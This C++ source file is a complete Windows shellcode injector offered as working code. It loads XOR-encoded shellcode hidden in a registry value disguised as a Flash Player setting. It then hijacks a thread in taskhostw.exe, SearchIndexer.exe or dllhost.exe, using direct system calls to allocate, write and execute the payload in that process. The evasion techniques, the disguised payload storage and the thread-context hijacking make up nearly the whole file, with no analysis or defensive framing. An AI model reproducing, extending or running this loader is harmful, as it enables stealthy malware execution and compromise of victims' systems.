// injector.cpp
// Thread-hijack shellcode injector — multi-target fallback
// Tries: taskhostw.exe -> SearchIndexer.exe -> dllhost.exe

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <time.h>
#include <vector>
#include <stdio.h>

#include "syscalls.h"

#pragma comment(lib, "advapi32.lib")

// -----------------------------------------------------------------------------
// Config
// -----------------------------------------------------------------------------
#define XOR_KEY             0x6B
#define REG_SUBKEY          L"Software\\Macromedia\\FlashPlayer"
#define REG_VALUE_NAME      L"Config"

static const wchar_t* TARGETS[] = {
    L"taskhostw.exe",
    L"SearchIndexer.exe",
    L"dllhost.exe",
};
static const int TARGET_COUNT = 3;

// -----------------------------------------------------------------------------
// Logger fichier
// -----------------------------------------------------------------------------
static void logmsg(const char* msg) {
    FILE* f = fopen("C:\\Users\\Public\\injector_log.txt", "a");
    if (!f) return;
    fprintf(f, "%s\r\n", msg);
    fclose(f);
}
static void loghex(const char* msg, unsigned long v) {
    FILE* f = fopen("C:\\Users\\Public\\injector_log.txt", "a");
    if (!f) return;
    fprintf(f, "%s 0x%08lX\r\n", msg, v);
    fclose(f);
}
static void logtarget(const wchar_t* name) {
    FILE* f = fopen("C:\\Users\\Public\\injector_log.txt", "a");
    if (!f) return;
    fwprintf(f, L"--- trying %s ---\r\n", name);
    fclose(f);
}

// -----------------------------------------------------------------------------
// Read XOR'd shellcode from registry
// -----------------------------------------------------------------------------
static std::vector<BYTE> ReadShellcodeFromRegistry() {
    std::vector<BYTE> sc;
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_SUBKEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return sc;

    DWORD type = 0, size = 0;
    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, &type, nullptr, &size) != ERROR_SUCCESS
        || type != REG_BINARY || size == 0) {
        RegCloseKey(hKey);
        return sc;
    }

    sc.resize(size);
    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, nullptr, sc.data(), &size) != ERROR_SUCCESS)
        sc.clear();

    RegCloseKey(hKey);
    return sc;
}

// -----------------------------------------------------------------------------
// Find PID by name, in OUR session only
// -----------------------------------------------------------------------------
static DWORD FindTargetProcessId(const wchar_t* name) {
    DWORD mySession = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &mySession);

    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                DWORD sess = 0;
                if (ProcessIdToSessionId(pe.th32ProcessID, &sess) && sess == mySession) {
                    pid = pe.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// -----------------------------------------------------------------------------
// Pick a thread, avoid the first one (usually UI/main thread)
// -----------------------------------------------------------------------------
static DWORD FindTargetThreadId(DWORD pid) {
    DWORD tids[128];
    int count = 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid && count < 128) {
                tids[count++] = te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    if (count == 0) return 0;
    if (count == 1) return tids[0];
    return tids[count / 2];   // middle thread
}

// -----------------------------------------------------------------------------
// Inject shellcode into a given PID via thread hijack
// -----------------------------------------------------------------------------
static bool InjectInto(DWORD pid, const std::vector<BYTE>& shellcode) {
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

    HANDLE hProcess = nullptr;
    CLIENT_ID cid = {};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    NTSTATUS status = Sw3NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &oa, &cid);

    if (status < 0 || !hProcess) { loghex("[X] NtOpenProcess", (unsigned long)status); return false; }
    logmsg("[+] NtOpenProcess OK");

    PVOID remoteBase = nullptr;
    SIZE_T regionSize = shellcode.size();
    status = Sw3NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &regionSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status < 0 || !remoteBase) {
        loghex("[X] NtAllocateVirtualMemory", (unsigned long)status);
        Sw3NtClose(hProcess); return false;
    }
    logmsg("[+] NtAllocateVirtualMemory OK");

    SIZE_T written = 0;
    status = Sw3NtWriteVirtualMemory(hProcess, remoteBase, (PVOID)shellcode.data(),
                                     shellcode.size(), &written);
    if (status < 0 || written != shellcode.size()) {
        loghex("[X] NtWriteVirtualMemory", (unsigned long)status);
        Sw3NtClose(hProcess); return false;
    }
    logmsg("[+] NtWriteVirtualMemory OK");

    ULONG oldProtect = 0;
    status = Sw3NtProtectVirtualMemory(hProcess, &remoteBase, &regionSize,
                                       PAGE_EXECUTE_READ, &oldProtect);
    if (status < 0) {
        loghex("[X] NtProtectVirtualMemory", (unsigned long)status);
        Sw3NtClose(hProcess); return false;
    }
    logmsg("[+] NtProtectVirtualMemory OK");

    DWORD tid = FindTargetThreadId(pid);
    if (!tid) { logmsg("[X] no thread found"); Sw3NtClose(hProcess); return false; }
    loghex("[+] target TID", tid);

    HANDLE hThread = nullptr;
    cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;
    status = Sw3NtOpenThread(&hThread,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
        &oa, &cid);
    if (status < 0 || !hThread) {
        loghex("[X] NtOpenThread", (unsigned long)status);
        Sw3NtClose(hProcess); return false;
    }
    logmsg("[+] NtOpenThread OK");

    ULONG prev = 0;
    if (Sw3NtSuspendThread(hThread, &prev) < 0) {
        logmsg("[X] suspend failed");
        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
    }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (Sw3NtGetContextThread(hThread, &ctx) < 0) {
        logmsg("[X] getcontext failed");
        Sw3NtResumeThread(hThread, &prev);
        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
    }

    ctx.Rip = (DWORD64)remoteBase;
    if (Sw3NtSetContextThread(hThread, &ctx) < 0) {
        logmsg("[X] setcontext failed");
        Sw3NtResumeThread(hThread, &prev);
        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
    }

    if (Sw3NtResumeThread(hThread, &prev) < 0) {
        logmsg("[X] resume failed");
        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
    }
    logmsg("[OK] thread hijacked, shellcode should run");

    Sw3NtClose(hThread);
    Sw3NtClose(hProcess);
    return true;
}

// -----------------------------------------------------------------------------
// Entry
// -----------------------------------------------------------------------------
int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    srand((unsigned int)time(nullptr) ^ GetTickCount());
    logmsg("=== INJECTOR START ===");

    std::vector<BYTE> shellcode = ReadShellcodeFromRegistry();
    if (shellcode.empty()) { logmsg("[X] no shellcode in registry"); return 1; }
    loghex("[1] shellcode size", (unsigned long)shellcode.size());

    for (auto& b : shellcode) b ^= XOR_KEY;
    logmsg("[2] shellcode decoded");

    for (int i = 0; i < TARGET_COUNT; i++) {
        logtarget(TARGETS[i]);

        DWORD pid = 0;
        for (int attempt = 0; attempt < 20; attempt++) {
            pid = FindTargetProcessId(TARGETS[i]);
            if (pid) break;
            Sleep(500);
        }
        if (!pid) { logmsg("[X] target not found, skipping"); continue; }

        loghex("[3] target PID", pid);

        if (InjectInto(pid, shellcode)) {
            logmsg("[SUCCESS] payload injected, waiting 3s...");
            Sleep(3000);
            return 0;
        }
        logmsg("[!] injection failed, trying next target");
    }

    logmsg("[FAIL] all targets exhausted");
    return 1;
}
